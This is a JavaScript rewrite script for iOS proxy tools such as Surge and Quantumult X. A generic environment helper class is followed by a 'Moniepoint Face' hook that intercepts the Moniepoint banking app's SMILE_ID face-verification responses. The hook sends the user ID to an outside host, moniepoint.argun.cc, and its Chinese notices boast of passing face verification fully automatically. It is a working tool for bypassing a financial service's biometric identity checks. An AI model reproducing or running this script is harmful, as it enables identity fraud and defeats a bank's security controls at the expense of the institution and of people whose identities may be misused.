class s {
  static name = "ENV";
  static version = "1.7.4";
  static about() {
    return console.log(`\n🟧 ${this.name} v${this.version}\n`);
  }
  constructor(e, t) {
    console.log(`\n🟧 ${s.name} v${s.version}\n`),
      (this.name = e),
      (this.logs = []),
      (this.isMute = !1),
      (this.isMuteLog = !1),
      (this.logSeparator = "\n"),
      (this.encoding = "utf-8"),
      (this.startTime = new Date().getTime()),
      Object.assign(this, t),
      this.log(`\n🚩 开始!\n${e}\n`);
  }
  platform() {
    return "undefined" != typeof $environment && $environment["surge-version"]
      ? "Surge"
      : "undefined" != typeof $environment && $environment["stash-version"]
      ? "Stash"
      : "undefined" != typeof module && module.exports
      ? "Node.js"
      : "undefined" != typeof $task
      ? "Quantumult X"
      : "undefined" != typeof $loon
      ? "Loon"
      : "undefined" != typeof $rocket
      ? "Shadowrocket"
      : "undefined" != typeof Egern
      ? "Egern"
      : void 0;
  }
  isNode() {
    return "Node.js" === this.platform();
  }
  isQuanX() {
    return "Quantumult X" === this.platform();
  }
  isSurge() {
    return "Surge" === this.platform();
  }
  isLoon() {
    return "Loon" === this.platform();
  }
  isShadowrocket() {
    return "Shadowrocket" === this.platform();
  }
  isStash() {
    return "Stash" === this.platform();
  }
  isEgern() {
    return "Egern" === this.platform();
  }
  async getScript(e) {
    return await this.fetch(e).then((e) => e.body);
  }
  async runScript(e, s) {
    let o = t.getItem("@chavy_boxjs_userCfgs.httpapi");
    o = o?.replace?.(/\n/g, "")?.trim();
    let a = t.getItem("@chavy_boxjs_userCfgs.httpapi_timeout");
    (a = 1 * a ?? 20), (a = s?.timeout ?? a);
    const [n, i] = o.split("@"),
      r = {
        url: `http://${i}/v1/scripting/evaluate`,
        body: { script_text: e, mock_type: "cron", timeout: a },
        headers: { "X-Key": n, Accept: "*/*" },
        timeout: a,
      };
    await this.fetch(r).then(
      (e) => e.body,
      (e) => this.logErr(e)
    );
  }
  initGotEnv(e) {
    (this.got = this.got ? this.got : require("got")),
      (this.cktough = this.cktough ? this.cktough : require("tough-cookie")),
      (this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar()),
      e &&
        ((e.headers = e.headers ? e.headers : {}),
        void 0 === e.headers.Cookie &&
          void 0 === e.cookieJar &&
          (e.cookieJar = this.ckjar));
  }
  async fetch(t = {} || "", s = {}) {
    switch (t.constructor) {
      case Object:
        t = { ...t, ...s };
        break;
      case String:
        t = { url: t, ...s };
    }
    t.method ||
      ((t.method = "GET"), (t.body ?? t.bodyBytes) && (t.method = "POST")),
      delete t.headers?.Host,
      delete t.headers?.[":authority"],
      delete t.headers?.["Content-Length"],
      delete t.headers?.["content-length"];
    const o = t.method.toLocaleLowerCase();
    switch (this.platform()) {
      case "Loon":
      case "Surge":
      case "Stash":
      case "Egern":
      case "Shadowrocket":
      default:
        return (
          t.policy &&
            (this.isLoon() && (t.node = t.policy),
            this.isStash() &&
              e.set(t, "headers.X-Stash-Selected-Proxy", encodeURI(t.policy))),
          "boolean" == typeof t.redirection &&
            (t["auto-redirect"] = t.redirection),
          t.bodyBytes &&
            !t.body &&
            ((t.body = t.bodyBytes), delete t.bodyBytes),
          await new Promise((e, s) => {
            $httpClient[o](t, (o, a, n) => {
              o
                ? s(o)
                : ((a.ok = /^2\d\d$/.test(a.status)),
                  (a.statusCode = a.status),
                  n &&
                    ((a.body = n), 1 == t["binary-mode"] && (a.bodyBytes = n)),
                  e(a));
            });
          })
        );
      case "Quantumult X":
        return (
          t.policy && e.set(t, "opts.policy", t.policy),
          "boolean" == typeof t["auto-redirect"] &&
            e.set(t, "opts.redirection", t["auto-redirect"]),
          t.body instanceof ArrayBuffer
            ? ((t.bodyBytes = t.body), delete t.body)
            : ArrayBuffer.isView(t.body)
            ? ((t.bodyBytes = t.body.buffer.slice(
                t.body.byteOffset,
                t.body.byteLength + t.body.byteOffset
              )),
              delete object.body)
            : t.body && delete t.bodyBytes,
          await $task.fetch(t).then(
            (e) => (
              (e.ok = /^2\d\d$/.test(e.statusCode)),
              (e.status = e.statusCode),
              e
            ),
            (e) => Promise.reject(e.error)
          )
        );
      case "Node.js":
        let s = require("iconv-lite");
        this.initGotEnv(t);
        const { url: a, ...n } = t;
        return await this.got[o](a, n)
          .on("redirect", (e, t) => {
            try {
              if (e.headers["set-cookie"]) {
                const s = e.headers["set-cookie"]
                  .map(this.cktough.Cookie.parse)
                  .toString();
                s && this.ckjar.setCookieSync(s, null),
                  (t.cookieJar = this.ckjar);
              }
            } catch (e) {
              this.logErr(e);
            }
          })
          .then(
            (e) => (
              (e.statusCode = e.status),
              (e.body = s.decode(e.rawBody, this.encoding)),
              (e.bodyBytes = e.rawBody),
              e
            ),
            (e) => Promise.reject(e.message)
          );
    }
  }
  time(e, t = null) {
    const s = t ? new Date(t) : new Date();
    let o = {
      "M+": s.getMonth() + 1,
      "d+": s.getDate(),
      "H+": s.getHours(),
      "m+": s.getMinutes(),
      "s+": s.getSeconds(),
      "q+": Math.floor((s.getMonth() + 3) / 3),
      S: s.getMilliseconds(),
    };
    /(y+)/.test(e) &&
      (e = e.replace(
        RegExp.$1,
        (s.getFullYear() + "").substr(4 - RegExp.$1.length)
      ));
    for (let t in o)
      new RegExp("(" + t + ")").test(e) &&
        (e = e.replace(
          RegExp.$1,
          1 == RegExp.$1.length
            ? o[t]
            : ("00" + o[t]).substr(("" + o[t]).length)
        ));
    return e;
  }
  msg(e = name, t = "", s = "", o) {
    const a = (e) => {
      switch (typeof e) {
        case void 0:
          return e;
        case "string":
          switch (this.platform()) {
            case "Surge":
            case "Stash":
            case "Egern":
            default:
              return { url: e };
            case "Loon":
            case "Shadowrocket":
              return e;
            case "Quantumult X":
              return { "open-url": e };
            case "Node.js":
              return;
          }
        case "object":
          switch (this.platform()) {
            case "Surge":
            case "Stash":
            case "Egern":
            case "Shadowrocket":
            default:
              return { url: e.url || e.openUrl || e["open-url"] };
            case "Loon":
              return {
                openUrl: e.openUrl || e.url || e["open-url"],
                mediaUrl: e.mediaUrl || e["media-url"],
              };
            case "Quantumult X":
              return {
                "open-url": e["open-url"] || e.url || e.openUrl,
                "media-url": e["media-url"] || e.mediaUrl,
                "update-pasteboard":
                  e["update-pasteboard"] || e.updatePasteboard,
              };
            case "Node.js":
              return;
          }
        default:
          return;
      }
    };
    if (!this.isMute)
      switch (this.platform()) {
        case "Surge":
        case "Loon":
        case "Stash":
        case "Egern":
        case "Shadowrocket":
        default:
          $notification.post(e, t, s, a(o));
          break;
        case "Quantumult X":
          $notify(e, t, s, a(o));
        case "Node.js":
      }
    if (!this.isMuteLog) {
      let o = ["", "==============📣系统通知📣=============="];
      o.push(e),
        t && o.push(t),
        s && o.push(s),
        console.log(o.join("\n")),
        (this.logs = this.logs.concat(o));
    }
  }
  log(...e) {
    e.length > 0 && (this.logs = [...this.logs, ...e]),
      console.log(e.join(this.logSeparator));
  }
  logErr(e) {
    switch (this.platform()) {
      case "Surge":
      case "Loon":
      case "Stash":
      case "Egern":
      case "Shadowrocket":
      case "Quantumult X":
      default:
        this.log("", `❗️ ${this.name}, 错误!`, e);
        break;
      case "Node.js":
        this.log("", `❗️${this.name}, 错误!`, e.stack);
    }
  }
  wait(e) {
    return new Promise((t) => setTimeout(t, e));
  }
  done(t = {}) {
    const s = (new Date().getTime() - this.startTime) / 1e3;
    switch (
      (this.log("", `🚩 ${this.name}, 结束! 🕛 ${s} 秒`, ""), this.platform())
    ) {
      case "Surge":
        t.policy && e.set(t, "headers.X-Surge-Policy", t.policy), $done(t);
        break;
      case "Loon":
        t.policy && (t.node = t.policy), $done(t);
        break;
      case "Stash":
        t.policy &&
          e.set(t, "headers.X-Stash-Selected-Proxy", encodeURI(t.policy)),
          $done(t);
        break;
      case "Egern":
      case "Shadowrocket":
      default:
        $done(t);
        break;
      case "Quantumult X":
        t.policy && e.set(t, "opts.policy", t.policy),
          delete t["auto-redirect"],
          delete t["auto-cookie"],
          delete t["binary-mode"],
          delete t.charset,
          delete t.host,
          delete t.insecure,
          delete t.method,
          delete t.opt,
          delete t.path,
          delete t.policy,
          delete t["policy-descriptor"],
          delete t.scheme,
          delete t.sessionIndex,
          delete t.statusCode,
          delete t.timeout,
          t.body instanceof ArrayBuffer
            ? ((t.bodyBytes = t.body), delete t.body)
            : ArrayBuffer.isView(t.body)
            ? ((t.bodyBytes = t.body.buffer.slice(
                t.body.byteOffset,
                t.body.byteLength + t.body.byteOffset
              )),
              delete t.body)
            : t.body && delete t.bodyBytes,
          $done(t);
        break;
      case "Node.js":
        process.exit(1);
    }
  }
}


;(async () => {
  const e = new s("🥜Moniepoint Face"); // 实例化 s 类, 可自定义脚本名称

  try {
    let body = $response.body;
    let obj = JSON.parse(body);
    if (obj.reference && obj.provider === "SMILE_ID") {
      const userId = obj.userId;
      e.log("准备发送POST请求，userId：", userId);
      // 使用 s 类的 fetch 方法发送 POST 请求
      let postResponse = await e.fetch({
        url: `https://moniepoint.argun.cc/smile?userid=${encodeURIComponent(userId)}`,
        method: "GET",
        headers: { "Content-Type": "application/json" }
      });
      e.log("POST请求完成，返回信息：", postResponse);
      if (postResponse.status === 200) {
        e.msg(e.name, "已使用全自动过人脸 ✌️", "全自动过人脸成功 ✅️");
        console.log('Request succeeded');
        e.done({ body: JSON.stringify(obj) });
      }
      // 修改响应内容
    }
    // 不修改响应内容，直接返回原始响应
    e.done({ body: obj });
  } catch (err) {
    e.logErr(err);
    e.done();
  }
})();